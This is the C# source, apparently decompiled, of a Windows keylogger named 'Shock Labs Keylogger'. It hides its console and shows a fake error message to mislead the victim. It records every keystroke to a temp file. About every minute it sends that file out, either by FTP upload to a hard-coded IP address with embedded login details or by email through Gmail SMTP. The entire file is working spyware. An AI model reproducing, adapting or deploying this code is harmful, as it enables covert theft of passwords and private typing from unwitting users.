using System;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace Shock_Labs_Keylogger_v1._0;

internal class Program
{
	public static int temp;

	public static int tMinute;

	public static bool UseFTP;

	public static StreamWriter Logger;

	public static int tHour;

	[DllImport("user32.dll")]
	public static extern bool GetAsyncKeyState(int vKeyCode);

	[DllImport("kernel32.dll")]
	public static extern bool FreeConsole();

	public static void Log()
	{
		//IL_0013: Unknown result type (might be due to invalid IL or missing references)
		FreeConsole();
		MessageBox.Show("This program is not a valid win32 application!", "Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
		UseFTP = true;
		tHour = DateTime.Now.Hour;
		tMinute = DateTime.Now.Minute;
		if (!File.Exists(Environment.GetEnvironmentVariable("TEMP") + "\\log.txt"))
		{
			FileStream fileStream = new FileStream(Environment.GetEnvironmentVariable("TEMP") + "\\log.txt", FileMode.Create);
			fileStream.Close();
		}
		Logger = new StreamWriter(Environment.GetEnvironmentVariable("TEMP") + "\\log.txt");
		while (true)
		{
			if (DateTime.Now.Minute != tMinute + 1 || (DateTime.Now.Minute < tMinute && DateTime.Now.Hour > tHour))
			{
				for (int i = 0; i <= 255; i++)
				{
					if (GetAsyncKeyState(i))
					{
						if (temp != i && i != 1 && i != 2)
						{
							Logger.Write(Convert.ToString((object)(Keys)i) + " ");
							temp = i;
							Thread.Sleep(55);
						}
						else
						{
							temp = -1203;
						}
						Thread.Sleep(55);
					}
				}
			}
			else
			{
				tMinute = DateTime.Now.Minute;
				tHour = DateTime.Now.Hour;
				Logger.Close();
				if (UseFTP)
				{
					Upload();
				}
				else
				{
					Email();
				}
			}
		}
	}

	public static void Email()
	{
		//IL_00d1: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string text = "example@gmail.com";
			string password = "examplepassword";
			SmtpClient smtpClient = new SmtpClient("smtp.gmail.com", 587);
			smtpClient.EnableSsl = true;
			smtpClient.Credentials = new NetworkCredential(text, password);
			MailMessage mailMessage = new MailMessage();
			mailMessage.To.Add(new MailAddress(text));
			mailMessage.From = new MailAddress(text);
			mailMessage.Attachments.Add(new Attachment(Environment.GetEnvironmentVariable("TEMP") + "\\log.txt"));
			mailMessage.Subject = "Keylogger Log for " + Convert.ToString(DateTime.Now);
			smtpClient.Send(mailMessage);
			mailMessage.Dispose();
			Thread.Sleep(5000);
			Logger = new StreamWriter(Environment.GetEnvironmentVariable("TEMP") + "\\log.txt");
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.ToString());
		}
	}

	public static void Upload()
	{
		//IL_00c0: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(new Uri("ftp://81.171.114.128/log.txt"));
			ftpWebRequest.UseBinary = true;
			ftpWebRequest.Credentials = new NetworkCredential("kevin", "0s3kWmBd");
			ftpWebRequest.Method = "STOR";
			Stream requestStream = ftpWebRequest.GetRequestStream();
			FileStream fileStream = new FileStream(Environment.GetEnvironmentVariable("TEMP") + "\\log.txt", FileMode.Open);
			byte[] array = new byte[fileStream.Length];
			Console.WriteLine(array.Length);
			fileStream.Read(array, 0, array.Length);
			requestStream.Write(array, 0, array.Length);
			fileStream.Close();
			requestStream.Close();
			Logger = new StreamWriter(Environment.GetEnvironmentVariable("TEMP") + "\\log.txt", append: true);
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.ToString());
		}
	}

	private static void Main(string[] args)
	{
		Thread thread = new Thread(Log);
		thread.Start();
	}
}
